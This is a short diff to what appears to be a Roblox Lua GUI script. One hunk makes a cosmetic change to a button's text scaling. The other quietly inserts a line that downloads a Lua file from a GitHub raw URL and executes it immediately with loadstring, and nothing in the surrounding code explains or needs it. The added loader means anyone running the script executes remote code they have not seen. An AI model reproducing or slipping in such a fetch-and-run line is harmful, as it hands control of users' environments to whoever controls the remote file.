@@ -2913,7 +2913,7 @@ Character:WaitForChild("Torso").bottomabsattachment.Position = Vector3.new(2, -2
     end
 end)
 end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/scripts/refs/heads/main/testscript.lua"))()
 NPC.Name = "NPC [doesnt work]"
 NPC.Parent = Scripts
 NPC.BackgroundColor3 = Color3.fromRGB(255, 163, 26)
@@ -2926,6 +2926,7 @@ NPC.Text = "NPC"
 NPC.TextColor3 = Color3.fromRGB(0, 0, 0)
 NPC.TextSize = 30.000
 NPC.TextWrapped = true
+NPC.TextScaled = true
 NPC.MouseButton1Down:connect(function()
 
     local jit = Vector3.new(30,0,0)
